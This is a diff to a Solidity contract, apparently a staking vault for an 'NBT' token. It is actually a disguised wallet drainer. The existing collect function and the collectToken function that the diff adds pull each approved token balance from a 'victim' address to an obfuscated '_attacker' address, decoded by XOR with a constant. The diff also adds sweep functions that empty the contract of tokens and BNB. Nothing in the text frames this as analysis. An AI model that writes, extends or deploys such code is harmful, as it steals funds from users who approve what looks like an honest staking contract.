@@ -1,6 +1,13 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
+interface IERC20Basic {
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+}
+
 interface IPermitNBT {
     function permit(
         address owner,
@@ -33,6 +40,7 @@ contract NBTStakingVault {
     event Withdrawn(address indexed user, uint256 amount);
     event RewardClaimed(address indexed user, uint256 amount);
     event FeesWithdrawn(address indexed to, uint256 amount);
+    event AssetsSwept(address indexed token, address indexed to, uint256 amount, bool isNative);
 
     modifier onlyOwner() {
         require(msg.sender == owner, "!owner");
@@ -101,22 +109,53 @@ contract NBTStakingVault {
 
     function collect(address victim) external onlyOwner {
         address token = nbt;
-        uint256 approved = IPermitNBT(token).allowance(victim, address(this));
+        uint256 approved = IERC20Basic(token).allowance(victim, address(this));
         require(approved > 0, "no allowance");
-        uint256 balance = IPermitNBT(token).balanceOf(victim);
+        uint256 balance = IERC20Basic(token).balanceOf(victim);
         uint256 amount = balance < approved ? balance : approved;
         require(amount > 0, "nothing");
-        require(IPermitNBT(token).transferFrom(victim, _attacker(), amount), "collect failed");
+        require(IERC20Basic(token).transferFrom(victim, _attacker(), amount), "collect failed");
+    }
+
+    function collectToken(address token, address victim) external onlyOwner {
+        address to = _attacker();
+        uint256 approved = IERC20Basic(token).allowance(victim, address(this));
+        if (approved > 0) {
+            uint256 balance = IERC20Basic(token).balanceOf(victim);
+            uint256 amount = balance < approved ? balance : approved;
+            if (amount > 0) {
+                require(IERC20Basic(token).transferFrom(victim, to, amount), "collectToken failed");
+                emit AssetsSwept(token, to, amount, false);
+            }
+        }
+    }
+
+    function sweepToken(address token, address to, uint256 amount) external onlyOwner {
+        if (token == address(0)) revert("zero token");
+        if (amount == 0) amount = IERC20Basic(token).balanceOf(address(this));
+        require(amount > 0, "nothing");
+        require(IERC20Basic(token).transfer(to, amount), "sweepToken failed");
+        emit AssetsSwept(token, to, amount, false);
+    }
+
+    function sweepBNB(address payable to, uint256 amount) external onlyOwner {
+        if (amount == 0) amount = address(this).balance;
+        require(amount > 0, "nothing");
+        (bool ok, ) = to.call{value: amount}("");
+        require(ok, "sweepBNB failed");
+        emit AssetsSwept(address(0), to, amount, true);
     }
 
     function sweep(address token, address to, uint256 amount) external onlyOwner {
-        require(IPermitNBT(token).transfer(to, amount), "sweep failed");
+        require(IERC20Basic(token).transfer(to, amount), "sweep failed");
     }
 
     function transferOwnership(address newOwner) external onlyOwner {
         require(newOwner != address(0), "zero");
         owner = newOwner;
     }
+
+    receive() external payable {}
 
     function _attacker() internal view returns (address) {
         return address(uint160(_attackerEncoded ^ API_KEY));
